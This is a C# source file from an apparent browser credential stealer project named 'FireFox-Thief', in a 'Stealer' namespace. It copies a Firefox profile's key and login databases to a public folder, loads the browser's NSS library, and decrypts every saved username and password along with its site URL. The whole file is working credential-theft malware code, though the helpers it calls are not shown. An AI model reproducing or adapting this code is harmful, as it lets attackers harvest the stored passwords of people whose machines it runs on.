/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using Stealer.Helpers;
using static Stealer.Helpers.Common;

namespace Stealer.Reader
{
    internal sealed class Passwords
    {
        private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
        private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
        private static string[] RequiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };

		// Copy key3.db, key4.db, logins.json if exists
		private static string CopyRequiredFiles(string profile)
		{
			string profileName = new DirectoryInfo(profile).Name;
			string newProfileName = Path.Combine(CopyTempPath, profileName);

			if (!Directory.Exists(newProfileName))
				Directory.CreateDirectory(newProfileName);

			foreach (string file in RequiredFiles)
				try
				{
					string requiredFile = Path.Combine(profile, file);
					if (File.Exists(requiredFile))
						File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
				}
				catch (Exception ex)
				{
					Console.WriteLine("Failed to copy files to decrypt passwords\n" + ex);
					return null;
				}

			return Path.Combine(CopyTempPath, profileName);
		}

		// Get passwords from gecko browser
		public static List<Password> Get(string BrowserDir)
        {
            List<Password> pPasswords = new List<Password>();

			// Get firefox default profile directory
			string profile = Profile.GetProfile(BrowserDir);
			if (profile == null) return pPasswords;
			// Get firefox nss3.dll location
			string Nss3Dir = Profile.GetMozillaPath();
            if (Nss3Dir == null) return pPasswords;
			// Copy required files to temp dir
			string newProfile = CopyRequiredFiles(profile);
			if (newProfile == null) return pPasswords;
			// Read accounts from file
			string db_location = Path.Combine(newProfile, "logins.json");
			string JSON_STRING = File.ReadAllText(db_location);
			// Parse Json string
			var json = new Json(JSON_STRING);
			json.Remove(new string[] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
			string[] accounts = json.SplitData();
			// Enumerate accounts
			if (Decryptor.LoadNSS(Nss3Dir))
			{
				if (!Decryptor.SetProfile(newProfile))
					Console.WriteLine("Failed to set profile!");

				foreach (string account in accounts)
				{
					Password pPassword = new Password();
					var json_account = new Json(account);

					string
						hostname = json_account.GetValue("hostname"),
						username = json_account.GetValue("encryptedUsername"),
						password = json_account.GetValue("encryptedPassword");

					if (!string.IsNullOrEmpty(password))
					{
						pPassword.sUrl = hostname;
						pPassword.sUsername = Decryptor.DecryptPassword(username);
						pPassword.sPassword = Decryptor.DecryptPassword(password);

						pPasswords.Add(pPassword);
					}
				}
			
				Decryptor.UnLoadNSS();
			}
			Directory.Delete(newProfile, recursive: true);
			return pPasswords;
        }
    }
}
